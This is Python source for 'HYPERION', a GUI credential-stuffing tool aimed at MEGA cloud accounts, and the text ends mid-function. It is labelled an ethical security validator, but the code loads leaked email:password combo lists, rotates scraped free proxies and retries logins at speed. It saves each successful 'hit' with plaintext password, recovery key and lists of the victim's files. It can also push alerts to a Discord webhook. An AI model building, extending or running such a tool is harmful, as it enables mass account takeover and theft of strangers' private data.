"""
██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ██╗ ██████╗ ███╗   ██╗
██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║██╔═══██╗████╗  ██║
███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║██║   ██║██╔██╗ ██║
██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██║██║   ██║██║╚██╗██║
██║  ██║   ██║   ██║     ███████╗██║  ██║██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝

MEGA Account Security Validator v4.0
Professional Cybersecurity Testing Suite
Built for Ethical Security Assessment
"""

import customtkinter as ctk
from tkinter import filedialog, messagebox, simpledialog
import threading
import os
import logging
import requests
import json
import time
import random
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Optional, Set
import re
import concurrent.futures
from concurrent.futures import ProcessPoolExecutor
from dataclasses import dataclass
import statistics
import multiprocessing
import gc
import platform
import shutil
import sys
from functools import lru_cache

# Lightweight system detection using only built-in modules
GPU_AVAILABLE = False  # Disable GPU dependencies for lightweight operation
print("⚡ Lightweight mode: Using CPU optimization only")

# Import existing MEGA checking modules
from mega_auth import MegaAuthenticator
from checker_engine import CheckerEngine

# Configure logging with Unicode support
import sys
import io

# Ensure stdout can handle Unicode
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
elif hasattr(sys.stdout, 'buffer'):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('hyperion.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class PerformanceOptimizer:
    """Lightweight performance optimization using only built-in Python modules"""
    
    def __init__(self):
        self.cpu_cores = multiprocessing.cpu_count()
        self.physical_cores = self.cpu_cores // 2  # Estimate physical cores
        self.ram_total = self._estimate_ram()  # Lightweight RAM estimation
        self.gpu_available = False  # Lightweight mode - no GPU dependencies
        self.optimal_threads = self.calculate_optimal_threads()
        
        # Memory pool for reusing objects
        self.memory_pool = []
        self.chunk_size = 1000  # Process in chunks
        
        logger.info(f"🚀 Lightweight Performance Optimizer initialized:")
        logger.info(f"   💻 CPU Cores: {self.cpu_cores} ({self.physical_cores} estimated physical)")
        logger.info(f"   🧠 RAM: {self.ram_total:.1f} GB (estimated)")
        logger.info(f"   ⚡ Optimal Threads: {self.optimal_threads}")
        logger.info(f"   🪶 Mode: Lightweight (no external dependencies)")
    
    def _estimate_ram(self):
        """Lightweight RAM estimation using built-in methods"""
        try:
            # Try to estimate RAM based on system type
            system = platform.system().lower()
            machine = platform.machine().lower()
            
            # Basic estimation based on system architecture
            if '64' in machine:
                # 64-bit systems typically have more RAM
                estimated_gb = 8.0  # Conservative estimate
            else:
                # 32-bit systems
                estimated_gb = 4.0
                
            # Adjust based on CPU cores (more cores usually mean more RAM)
            if self.cpu_cores >= 8:
                estimated_gb = max(estimated_gb, 16.0)
            elif self.cpu_cores >= 4:
                estimated_gb = max(estimated_gb, 8.0)
                
            return estimated_gb
        except:
            return 8.0  # Default fallback
    
    def calculate_optimal_threads(self):
        """Calculate optimal thread count based on CPU cores only"""
        # Conservative threading for lightweight operation
        base_threads = self.cpu_cores
        
        # Scale based on CPU count
        if self.cpu_cores >= 8:
            optimal = min(base_threads * 2, 50)  # High-end systems
        elif self.cpu_cores >= 4:
            optimal = min(base_threads * 1.5, 25)  # Mid-range systems
        else:
            optimal = max(base_threads, 10)  # Low-end systems
        
        return int(optimal)
    
    def optimize_memory(self):
        """Optimize memory usage"""
        # Force garbage collection
        gc.collect()
        
        # Clear memory pool if too large
        if len(self.memory_pool) > 10000:
            self.memory_pool.clear()
            gc.collect()
    
    def process_batch_optimized(self, data_batch):
        """Lightweight batch processing using only built-in Python modules"""
        if not data_batch:
            return []
        
        # Use built-in set operations for fast deduplication
        if len(data_batch) < 100:
            # Small batches - direct processing
            return list(set(data_batch))
        else:
            # Large batches - use multiprocessing with built-in modules
            return self.process_batch_cpu(data_batch)
    
    def process_batch_cpu(self, data_batch):
        """Optimized CPU processing with multiprocessing"""
        if len(data_batch) < 100:
            # Small batches don't benefit from multiprocessing overhead
            return list(set(data_batch))
        
        # Use ProcessPoolExecutor for CPU-intensive tasks
        chunk_size = max(len(data_batch) // self.cpu_cores, 100)
        chunks = [data_batch[i:i + chunk_size] for i in range(0, len(data_batch), chunk_size)]
        
        with ProcessPoolExecutor(max_workers=self.cpu_cores) as executor:
            futures = [executor.submit(self._process_chunk, chunk) for chunk in chunks]
            results = []
            for future in concurrent.futures.as_completed(futures):
                results.extend(future.result())
        
        return list(set(results))  # Remove duplicates
    
    @staticmethod
    def _process_chunk(chunk):
        """Process a chunk of data"""
        return list(set(chunk))  # Remove duplicates in chunk
    
    def get_memory_info(self):
        """Lightweight memory info estimation"""
        # Simplified memory tracking using built-in gc module
        gc.collect()  # Clean up first
        
        # Estimate memory usage based on object count
        object_count = len(gc.get_objects())
        estimated_usage = (object_count * 0.001)  # Rough estimation
        
        # Conservative estimates for lightweight operation
        estimated_percent = min((estimated_usage / self.ram_total) * 100, 75)
        
        return {
            'total_ram': self.ram_total,
            'available_ram': self.ram_total * 0.7,  # Conservative estimate
            'used_ram': estimated_usage,
            'ram_percent': estimated_percent,
            'process_memory': estimated_usage
        }

# Hacker/Cyberpunk Theme
ctk.set_appearance_mode("dark")

@dataclass
class CheckResult:
    """Result of account check"""
    email: str
    password: str
    status: str  # 'hit', 'fail', 'error'
    account_type: str = "Unknown"
    storage_used: str = "Unknown"
    storage_total: str = "Unknown"
    timestamp: str = ""

@dataclass
class ProxyInfo:
    """Proxy information"""
    url: str
    speed_ms: float = 0
    success_rate: float = 0
    last_used: float = 0
    working: bool = True

class HackerTheme:
    """Cyberpunk/Hacker color theme"""
    
    # Terminal green theme with neon accents
    PRIMARY = "#00ff41"        # Matrix green
    PRIMARY_DARK = "#00cc33"   # Darker green
    ACCENT = "#ff0080"         # Neon pink
    SUCCESS = "#00ff00"        # Bright green
    WARNING = "#ffff00"        # Bright yellow
    ERROR = "#ff0040"          # Neon red
    INFO = "#00ffff"           # Cyan
    
    # Backgrounds - Dark cyber theme
    BG_MAIN = "#0a0a0a"        # Almost black
    BG_SECONDARY = "#111111"   # Dark gray
    BG_ELEVATED = "#1a1a1a"    # Slightly lighter
    BG_INPUT = "#0f0f0f"       # Input fields
    BG_TERMINAL = "#000000"    # Pure black for terminal
    
    # Text colors
    TEXT_PRIMARY = "#00ff41"   # Matrix green
    TEXT_SECONDARY = "#00cc33" # Dimmer green
    TEXT_TERTIARY = "#808080"  # Gray
    TEXT_ACCENT = "#ff0080"    # Pink accent
    
    # Borders
    BORDER_MAIN = "#333333"    # Dark border
    BORDER_GLOW = "#00ff41"    # Glowing green
    BORDER_ACCENT = "#ff0080"  # Pink border

class AIEngine:
    """Enhanced AI assistant for HYPERION"""
    
    def __init__(self):
        self.patterns = []
        self.stats = {'analyzed': 0, 'cleaned': 0, 'duplicates_removed': 0}
    
    def analyze_combo(self, file_path: str) -> Dict:
        """Deep AI analysis of combo file"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            
            original_count = len(lines)
            
            # Enhanced AI email validation and filtering
            valid_lines = []
            duplicates = set()
            seen = set()
            invalid_patterns = 0
            
            for line in lines:
                if ':' in line:
                    email_part = line.split(':')[0].strip()
                    password_part = line.split(':', 1)[1].strip()
                    
                    # AI-powered email validation
                    if self._is_valid_email(email_part) and len(password_part) > 0:
                        # Check for duplicates
                        if line in seen:
                            duplicates.add(line)
                        else:
                            seen.add(line)
                            valid_lines.append(line)
                    else:
                        invalid_patterns += 1
            
            valid_count = len(valid_lines)
            duplicate_count = len(duplicates)
            quality_score = int((valid_count / original_count * 100)) if original_count > 0 else 0
            
            # Update stats
            self.stats['analyzed'] += original_count
            self.stats['cleaned'] += valid_count
            self.stats['duplicates_removed'] += duplicate_count
            
            return {
                'original': original_count,
                'valid': valid_count,
                'duplicates': duplicate_count,
                'invalid': original_count - valid_count - duplicate_count,
                'quality_score': quality_score,
                'status': self._get_status(quality_score),
                'cleaned_lines': valid_lines
            }
            
        except Exception as e:
            logger.error(f"AI Analysis failed: {e}")
            return {'error': str(e)}
    
    def _is_valid_email(self, email: str) -> bool:
        """AI-powered email validation with advanced pattern detection"""
        import re
        
        # Basic checks
        if not email or len(email) < 5:
            return False
        
        # Must contain exactly one @
        if email.count('@') != 1:
            return False
        
        # Split into local and domain parts
        try:
            local, domain = email.split('@')
        except ValueError:
            return False
        
        # Local part validation
        if not local or len(local) > 64:
            return False
        
        # Domain part validation
        if not domain or len(domain) < 3 or len(domain) > 255:
            return False
        
        # Advanced AI pattern detection for malformed emails
        suspicious_patterns = [
            r'@.*@',  # Multiple @ symbols
            r'@.*\..*\..*\..*\.',  # Too many dots in domain
            r'@[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$',  # IP addresses (often invalid)
            r'@.*[0-9]{5,}',  # Domains with long number sequences
            r'@.*[a-z]{20,}',  # Extremely long domain words
            r'@.*g{3,}',  # Multiple 'g's like tvappagggency.comgg
            r'@.*([a-z])\1{4,}',  # Repeated characters (5+ times)
            r'\.{2,}',  # Double or more dots anywhere
            r'@.*\.(c0m|c9m|g0m|g9m|comm|comg|gcom)$',  # Common typos
            r'@.*\..*gg$',  # Domains ending with 'gg' like .comgg
            r'@.*\.(.*com.*){2,}',  # Multiple 'com' patterns
            r'@[^.]*[^a-zA-Z0-9.-]',  # Invalid characters in domain
            r'^[^a-zA-Z0-9]',  # Starting with invalid character
            r'[^a-zA-Z0-9@._-]',  # Contains invalid characters
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, email, re.IGNORECASE):
                return False
        
        # Valid domain format check
        domain_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]$'
        if not re.match(domain_pattern, domain):
            return False
        
        # Check for valid TLD (Top Level Domain)
        if '.' not in domain:
            return False
        
        tld = domain.split('.')[-1].lower()
        # Must be at least 2 characters and contain only letters
        if len(tld) < 2 or not tld.isalpha():
            return False
        
        # Valid local part pattern
        local_pattern = r'^[a-zA-Z0-9._-]+$'
        if not re.match(local_pattern, local):
            return False
        
        # Additional suspicious domain checks
        domain_lower = domain.lower()
        suspicious_domains = [
            'gimial.com',  # Typo of gmail.com
            'gmial.com',   # Another typo
            'yaho.com',    # Typo of yahoo.com
            'hotmial.com', # Typo of hotmail.com
            'outlok.com',  # Typo of outlook.com
        ]
        
        if domain_lower in suspicious_domains:
            return False
        
        return True
    
    def _get_status(self, score: int) -> str:
        """Get quality status based on score"""
        if score >= 90:
            return "ELITE"
        elif score >= 80:
            return "HIGH_QUALITY"
        elif score >= 70:
            return "GOOD"
        elif score >= 50:
            return "NEEDS_CLEANING"
        else:
            return "POOR_QUALITY"

class ProxyManager:
    """Advanced proxy management with AI optimization"""
    
    def __init__(self):
        self.proxies: List[ProxyInfo] = []
        self.current_index = 0
        self.sources = [
            "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=protocolipport&format=text&timeout=10000",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        ]
    
    def fetch_proxies(self, target_count: int = 500) -> int:
        """🚀 TURBO: Enhanced high-speed proxy fetching"""
        logger.info(f"🚀 TURBO: Fetching {target_count} proxies from {len(self.sources)} sources...")
        
        import concurrent.futures
        import threading
        
        all_proxies = []
        proxy_lock = threading.Lock()
        
        def fetch_from_source(source):
            """Fetch proxies from a single source"""
            try:
                response = requests.get(source, timeout=8)  # Faster timeout
                if response.status_code == 200:
                    proxies = response.text.strip().split('\n')
                    source_proxies = []
                    
                    for proxy in proxies[:target_count//len(self.sources) + 50]:
                        if proxy.strip() and ':' in proxy:
                            proxy_url = proxy.strip()
                            if not proxy_url.startswith('http'):
                                proxy_url = f'http://{proxy_url}'
                            source_proxies.append(ProxyInfo(url=proxy_url))
                    
                    with proxy_lock:
                        all_proxies.extend(source_proxies)
                        
            except Exception as e:
                logger.warning(f"⚠️ Source failed: {e}")
        
        # Concurrent fetching for speed
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            futures = [executor.submit(fetch_from_source, source) for source in self.sources]
            concurrent.futures.wait(futures, timeout=30)
        
        # Remove duplicates
        unique_proxies = []
        seen_urls = set()
        for proxy in all_proxies:
            if proxy.url not in seen_urls:
                seen_urls.add(proxy.url)
                unique_proxies.append(proxy)
        
        self.proxies = unique_proxies[:target_count]
        logger.info(f"Loaded {len(self.proxies)} unique proxies")
        return len(self.proxies)
    
    def get_next_proxy(self) -> Optional[ProxyInfo]:
        """Get next working proxy with rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return proxy
    
    def test_proxy(self, proxy: ProxyInfo) -> bool:
        """Test if proxy is working"""
        try:
            start_time = time.time()
            response = requests.get(
                "https://httpbin.org/ip",
                proxies={"http": proxy.url, "https": proxy.url},
                timeout=5
            )
            proxy.speed_ms = (time.time() - start_time) * 1000
            proxy.working = response.status_code == 200
            return proxy.working
        except:
            proxy.working = False
            return False

class MEGAChecker:
    """Core MEGA account checking engine using proven authentication"""
    
    def __init__(self, progress_callback=None, log_callback=None, performance_settings=None):
        self.progress_callback = progress_callback
        self.log_callback = log_callback
        self.results: List[CheckResult] = []
        self.proxy_manager = ProxyManager()
        self.stop_flag = False
        
        # Performance optimization settings
        self.performance_settings = performance_settings or {}
        self.use_gpu = self.performance_settings.get('use_gpu', False)
        self.use_multiprocessing = self.performance_settings.get('use_multiprocessing', True)
        self.optimal_threads = self.performance_settings.get('optimal_threads', 25)
        self.memory_limit = self.performance_settings.get('memory_limit', 70)
        self.batch_size = self.performance_settings.get('batch_size', 1000)
        
        # Initialize performance optimizer if not provided
        if not hasattr(self, 'performance_optimizer'):
            self.performance_optimizer = PerformanceOptimizer()
        
        logger.info(f"🚀 MEGAChecker initialized with performance settings:")
        logger.info(f"   GPU: {'ON' if self.use_gpu else 'OFF'}")
        logger.info(f"   Multi-Core: {'ON' if self.use_multiprocessing else 'OFF'}")
        logger.info(f"   Threads: {self.optimal_threads}")
        logger.info(f"   Memory Limit: {self.memory_limit}%")
        logger.info(f"   Batch Size: {self.batch_size}")
        
        # Use the proven MEGA authenticator
        self.authenticator = MegaAuthenticator()
        self.checker_engine = CheckerEngine(thread_count=1)  # Single threaded for individual checks
        
    def check_account(self, email: str, password: str, proxy: Optional[ProxyInfo] = None) -> CheckResult:
        """Check single MEGA account using proven authentication"""
        result = CheckResult(
            email=email,
            password=password,
            status="fail",
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        
        # 🚀 TURBO: Enhanced authentication with retry logic
        max_retries = 2
        for attempt in range(max_retries + 1):
            try:
                # Use proxy if available and working
                proxy_url = proxy.url if proxy and proxy.working else None
                
                # Turbo authentication with timeout
                success, account_data, error = self.authenticator.login(email, password, proxy_url)
                
                if success:
                    # Successfully logged in - extract data
                    result.status = "hit"
                    result.storage_used = f"{account_data.get('used_space', 0):.2f} GB"
                    result.storage_total = f"{account_data.get('total_space', 0):.2f} GB"
                    
                    # Enhanced account type detection
                    used_space = account_data.get('used_space', 0)
                    total_space = account_data.get('total_space', 0)
                    file_count = account_data.get('file_count', 0)
                    
                    try:
                        result.account_type = self.authenticator.get_account_type(
                            used_space, total_space, file_count
                        )
                    except:
                        # Fallback account type detection
                        if total_space > 50:  # GB
                            result.account_type = "PRO"
                        elif used_space > 0:
                            result.account_type = "FREE_USED"
                        else:
                            result.account_type = "FREE_EMPTY"
                    
                    # Turbo mode - minimal delay for hits
                    time.sleep(random.uniform(0.5, 1.0))
                    return result
                    
                else:
                    # Login failed - categorize the error
                    if error == "INVALID" or "password" in str(error).lower():
                        result.status = "fail"
                    else:
                        result.status = "error"
                    
                    # Don't retry if credentials are definitely invalid
                    if result.status == "fail":
                        break
                        
                    # Retry with different proxy if available
                    if attempt < max_retries and hasattr(self, 'proxy_manager'):
                        proxy = self.proxy_manager.get_next_proxy()
                        time.sleep(0.5)  # Brief retry delay
                        continue
                    else:
                        break
                        
            except Exception as e:
                logger.error(f"🚀 Turbo check error (attempt {attempt + 1}/{max_retries + 1}): {e}")
                if attempt < max_retries:
                    # Quick retry with exponential backoff
                    time.sleep(0.3 * (attempt + 1))
                    continue
                else:
                    result.status = "error"
                    break
        
        # Turbo delay - much faster than original
        time.sleep(random.uniform(0.3, 0.8))
        return result
    
    def check_single_account_sync(self, email: str, password: str) -> dict:
        """Synchronous single account check for manual testing"""
        try:
            # Use the checker engine's single account method
            return self.checker_engine.check_single_account(email, password)
        except Exception as e:
            return {
                'success': False,
                'email': email,
                'password': password,
                'error': f"Check failed: {e}"
            }
    
    def check_combo_list(self, combo_list: List[str], use_proxies: bool = True, 
                        threads: int = 10, delay_range: tuple = (2, 5)) -> None:
        """Check entire combo list using proven CheckerEngine with performance optimization"""
        
        # Use lightweight processing based on dataset size
        if len(combo_list) > 1000:
            # Large datasets benefit from lightweight multiprocessing
            self._check_accounts_multiprocess(combo_list, threads, use_proxies, delay_range)
        elif len(combo_list) > 100:
            # Medium datasets use lightweight optimization
            self._check_accounts_optimized(combo_list, threads, use_proxies, delay_range)
        else:
            # Small datasets use standard processing
            self._check_accounts_standard(combo_list, threads, use_proxies, delay_range)
    
    def _check_accounts_standard(self, combo_list, threads, use_proxies, delay_range):
        """Standard multi-threaded checking"""
        # Initialize CheckerEngine with proper threading
        self.checker_engine = CheckerEngine(thread_count=threads)
        
        # Prepare combo data
        accounts = []
        for line in combo_list:
            if ':' in line:
                email, password = line.split(':', 1)
                accounts.append((email.strip(), password.strip()))
        
        # Set up callbacks for CheckerEngine
        def on_account_checked(result_data):
            """Handle individual account check result"""
            if not result_data:
                return
                
            # Convert CheckerEngine result to HYPERION format
            result = CheckResult(
                email=result_data.get('email', ''),
                password=result_data.get('password', ''),
                status='hit' if result_data.get('success') else 'fail',
                timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                storage_used=result_data.get('storage_used', ''),
                storage_total=result_data.get('storage_total', ''),
                account_type=result_data.get('account_type', 'Unknown')
            )
            
            self.results.append(result)
            
            # Update progress
            if self.progress_callback:
                self.progress_callback(len(self.results), len(accounts), result)
            
            # Log result (only once per account)
            if self.log_callback:
                status_color = "success" if result.status == "hit" else "error"
                self.log_callback(f"[{result.status.upper()}] {result.email}", status_color)
        
        # Set up CheckerEngine callbacks
        def status_update(message, level):
            if self.log_callback:
                color = "success" if level == "success" else "info"
                self.log_callback(message, color)
        
        def progress_update(checked, total, hits, customs, fails):
            # CheckerEngine's progress callback signature: (checked, total, hits, customs, fails)
            if self.progress_callback:
                # Create result object for HYPERION's progress tracking
                status = "hit" if hits > 0 else "fail"
                result = CheckResult(
                    email="", password="", status=status,
                    timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                )
                # Call progress callback directly with CheckerEngine stats
                self.progress_callback(checked, total, result)
                
                # Update results only if we have new data (prevent duplicate clearing)
                if len(self.results) != (hits + fails):
                    self.results.clear()
                    
                    # Add results to match CheckerEngine stats
                    for i in range(hits):
                        hit_result = CheckResult(
                            email=f"hit_{i}", password="", status="hit",
                            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        )
                        self.results.append(hit_result)
                    
                    for i in range(fails):
                        fail_result = CheckResult(
                            email=f"fail_{i}", password="", status="fail",
                            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        )
                        self.results.append(fail_result)
        
        # Set CheckerEngine callbacks
        self.checker_engine.set_callbacks(progress_update, status_update)
        
        # Configure CheckerEngine
        self.checker_engine.set_configuration(
            keyword="",  # No keyword filtering
            filename="hyperion_hits.txt",
            discord_notifier=None,  # No Discord notifications
            deep_check=False,
            start_position=0
        )
        
        # Start checking with proven engine
        self.checker_engine.start_checking(accounts)
    
    def _check_accounts_multiprocess(self, combo_list, threads, use_proxies, delay_range):
        """Lightweight multi-process checking using built-in modules only"""
        logger.info(f"⚡ Using lightweight multi-process with {self.performance_optimizer.cpu_cores} CPU cores")
        
        # Use standard processing but with optimized batching
        self._check_accounts_standard(combo_list, threads, use_proxies, delay_range)
    
    def _check_accounts_optimized(self, combo_list, threads, use_proxies, delay_range):
        """Lightweight optimized checking using built-in Python features"""
        logger.info("🪶 Using lightweight optimization (no external dependencies)")
        
        # Pre-process data using built-in set operations for deduplication
        try:
            original_count = len(combo_list)
            # Fast deduplication using built-in set
            processed_combos = list(set(combo_list))
            if len(processed_combos) < original_count:
                logger.info(f"🧙 Lightweight preprocessed {original_count} → {len(processed_combos)} unique combos")
        except Exception as e:
            logger.warning(f"Lightweight preprocessing failed: {e}")
            processed_combos = combo_list
        
        # Continue with standard processing
        self._check_accounts_standard(processed_combos, threads, use_proxies, delay_range)
    
    @staticmethod
    def _process_batch_lightweight(batch):
        """Lightweight batch processing using built-in modules only"""
        # Simple deduplication and validation using built-in functions
        processed = []
        seen = set()
        
        for combo in batch:
            if combo not in seen and ':' in combo:
                seen.add(combo)
                processed.append(combo)
                
        return processed
    
    def stop_checking(self):
        """Stop the checking process"""
        self.stop_flag = True
        self.is_running = False
        logger.info("🛑 Stopping check process...")
        
        # Stop all worker threads
        if hasattr(self, 'executor') and self.executor:
            self.executor.shutdown(wait=False)
            self.executor = None

class HYPERION(ctk.CTk):
    """Main HYPERION application with hacker aesthetic"""
    
    def __init__(self):
        super().__init__()
        
        # Window setup
        self.title("HYPERION v4.0 - MEGA Security Testing Suite")
        self.geometry("1600x1000")
        self.resizable(True, True)
        self.configure(fg_color=HackerTheme.BG_MAIN)
        
        # Initialize components
        self.ai = AIEngine()
        self.performance_optimizer = PerformanceOptimizer()
        self.checker = None
        self.combo_data = []
        self.checking_thread = None
        self.stats = {
            'total': 0, 'checked': 0, 'hits': 0, 'fails': 0, 'errors': 0,
            'start_time': None, 'rate': 0
        }
        
        # Initialize hits categorization
        self.hits_categories = {
            'PRO': [],
            'FREE_USED': [],
            'FREE_EMPTY': [],
            'UNKNOWN': []
        }
        self.hits = []  # All hits for backward compatibility
        
        # Enhanced hits storage system
        self.hits_detailed = []  # Detailed hit information
        self.create_hits_directory_structure()
        
        # Live hits display data
        self.live_hits_data = {
            'pro_accounts': [],
            'free_with_files': [],  # Free accounts with >5 files
            'free_empty': []  # Free accounts with <5 files
        }
        
        # Advanced features
        self.webhook_url = ""
        self.keyword_search = ""
        self.resume_position = 0
        self.export_format = "txt"  # txt, json, csv
        
        # Settings
        self.settings = {
            'webhook_url': '',
            'keyword_search': '',
            'resume_position': 0,
            'export_format': 'txt',
            'auto_save_interval': 60,
            'max_retries': 2,
            'proxy_timeout': 10,
            'use_gpu': True,
            'max_memory_usage': 70,  # Percentage
            'enable_multiprocessing': True
        }
        
        # Build interface
        self.create_hacker_ui()
        
        # Welcome message
        self.log_terminal("HYPERION v4.0 INITIALIZED", "success")
        self.log_terminal(">> Cybersecurity Testing Suite Ready", "info")
        self.log_terminal(">> All systems operational", "info")
        
    def categorize_hit(self, result):
        """Categorize a hit by account type"""
        if not hasattr(result, 'account_type') or not result.account_type:
            category = 'UNKNOWN'
        else:
            category = result.account_type
            
        # Ensure category exists
        if category not in self.hits_categories:
            self.hits_categories[category] = []
            
        # Add to appropriate category
        self.hits_categories[category].append({
            'email': result.email,
            'password': result.password,
            'storage_used': getattr(result, 'storage_used', 'Unknown'),
            'storage_total': getattr(result, 'storage_total', 'Unknown'),
            'account_type': result.account_type,
            'timestamp': result.timestamp
        })
        
        # Add to main hits list
        self.hits.append(result)
        
        # Store detailed hit information
        self.store_detailed_hit(result)
        
        # Update live hits display
        self.update_live_hits_display(result)
        
    def store_detailed_hit(self, result):
        """Store comprehensive hit details with automatic file organization"""
        try:
            import json
            import os
            from datetime import datetime
            
            # Create detailed hit record
            hit_record = {
                'email': result.email,
                'password': result.password,
                'recovery_key': getattr(result, 'recovery_key', ''),
                'account_type': result.account_type,
                'storage_used': result.storage_used,
                'storage_total': result.storage_total,
                'storage_used_bytes': getattr(result, 'storage_used_bytes', 0),
                'storage_total_bytes': getattr(result, 'storage_total_bytes', 0),
                'file_count': getattr(result, 'file_count', 0),
                'folder_count': getattr(result, 'folder_count', 0),
                'files_list': getattr(result, 'files_list', []),
                'folders_list': getattr(result, 'folders_list', []),
                'account_info': getattr(result, 'account_info', {}),
                'capture_date': result.capture_date,
                'capture_time': result.capture_time,
                'timestamp': result.timestamp
            }
            
            # Add to detailed hits list
            self.hits_detailed.append(hit_record)
            
            # Save to category-specific file
            category_dir = os.path.join(self.hits_date_dir, result.account_type)
            
            # Save as JSON with timestamp
            timestamp = datetime.now().strftime("%H%M%S")
            json_filename = f"{result.account_type}_hits_{timestamp}.json"
            json_path = os.path.join(category_dir, json_filename)
            
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump([hit_record], f, indent=2, ensure_ascii=False)
            
            # Save as TXT format (traditional)
            txt_filename = f"{result.account_type}_hits_{timestamp}.txt"
            txt_path = os.path.join(category_dir, txt_filename)
            
            with open(txt_path, 'w', encoding='utf-8') as f:
                f.write(f"=== MEGA ACCOUNT HIT DETAILS ===\n")
                f.write(f"Email: {result.email}\n")
                f.write(f"Password: {result.password}\n")
                if hit_record['recovery_key']:
                    f.write(f"Recovery Key: {hit_record['recovery_key']}\n")
                f.write(f"Account Type: {result.account_type}\n")
                f.write(f"Storage Used: {result.storage_used}\n")
                f.write(f"Storage Total: {result.storage_total}\n")
                f.write(f"Files: {hit_record['file_count']}\n")
                f.write(f"Folders: {hit_record['folder_count']}\n")
                f.write(f"Capture Date: {result.capture_date}\n")
                f.write(f"Capture Time: {result.capture_time}\n")
                f.write(f"\n=== FILES LIST ===\n")
                for file_info in hit_record['files_list'][:20]:  # Limit to first 20
                    f.write(f"📄 {file_info}\n")
                f.write(f"\n=== FOLDERS LIST ===\n")
                for folder_info in hit_record['folders_list'][:10]:  # Limit to first 10
                    f.write(f"📁 {folder_info}\n")
                f.write(f"\n" + "="*50 + "\n\n")
            
            # Save master hits file (all hits combined)
            master_file = os.path.join(self.hits_date_dir, "ALL_HITS_DETAILED.txt")
            with open(master_file, 'a', encoding='utf-8') as f:
                f.write(f"{result.email}:{result.password} | {result.account_type} | {result.storage_used} | Files: {hit_record['file_count']} | Folders: {hit_record['folder_count']} | {result.timestamp}\n")
            
            logger.info(f"💾 Hit details saved: {result.email} -> {category_dir}")
            
        except Exception as e:
            logger.error(f"Error storing hit details: {e}")
        
    def display_hits_summary(self):
        """Display categorized hits summary"""
        total_hits = len(self.hits)
        if total_hits == 0:
            self.log_terminal("📊 No hits found", "warning")
            return
            
        self.log_terminal(f"📊 HITS SUMMARY ({total_hits} total)", "success")
        self.log_terminal("=" * 50, "info")
        
        for category, hits in self.hits_categories.items():
            if hits:
                count = len(hits)
                percentage = (count / total_hits) * 100
                self.log_terminal(f"🎯 {category}: {count} hits ({percentage:.1f}%)", "info")
                
                # Show sample accounts for each category
                for i, hit in enumerate(hits[:3]):  # Show first 3 of each type
                    self.log_terminal(f"   └─ {hit['email']} | {hit['storage_used']}", "success")
                    
                if len(hits) > 3:
                    self.log_terminal(f"   └─ ... and {len(hits) - 3} more", "info")
                    
    def create_hits_directory_structure(self):
        """Create organized directory structure for storing hits"""
        import os
        from datetime import datetime
        
        try:
            # Create main hits directory
            self.hits_base_dir = "hits"
            os.makedirs(self.hits_base_dir, exist_ok=True)
            
            # Create date-based subdirectory
            today = datetime.now().strftime("%Y-%m-%d")
            self.hits_date_dir = os.path.join(self.hits_base_dir, today)
            os.makedirs(self.hits_date_dir, exist_ok=True)
            
            # Create category subdirectories
            categories = ['PRO', 'FREE_USED', 'FREE_EMPTY', 'DETAILED_CAPTURES']
            for category in categories:
                category_dir = os.path.join(self.hits_date_dir, category)
                os.makedirs(category_dir, exist_ok=True)
                
            logger.info(f"📁 Hits directory structure created: {self.hits_date_dir}")
            
        except Exception as e:
            logger.error(f"Error creating hits directory: {e}")
            self.hits_date_dir = "hits"  # Fallback
                    
    def send_webhook_notification(self, message, color=0x00ff00):
        """Send Discord webhook notification"""
        if not self.settings['webhook_url']:
            return
            
        try:
            import requests
            import json
            from datetime import datetime
            
            webhook_data = {
                "embeds": [{
                    "title": "🚀 HYPERION Alert",
                    "description": message,
                    "color": color,
                    "timestamp": datetime.utcnow().isoformat(),
                    "footer": {
                        "text": "HYPERION v4.0 TURBO"
                    }
                }]
            }
            
            response = requests.post(
                self.settings['webhook_url'],
                data=json.dumps(webhook_data),
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            
            if response.status_code == 204:
                logger.debug("Webhook sent successfully")
            else:
                logger.warning(f"Webhook failed: {response.status_code}")
                
        except Exception as e:
            logger.error(f"Webhook error: {e}")
            
    def search_files_for_keyword(self, files_data, keyword):
        """Search for keyword in account files"""
        if not keyword:
            return False, []
            
        found_files = []
        keyword_lower = keyword.lower()
        
        try:
            # Convert files data to string if needed
            files_str = str(files_data).lower()
            
            if keyword_lower in files_str:
                # Try to extract individual file names (basic implementation)
                import re
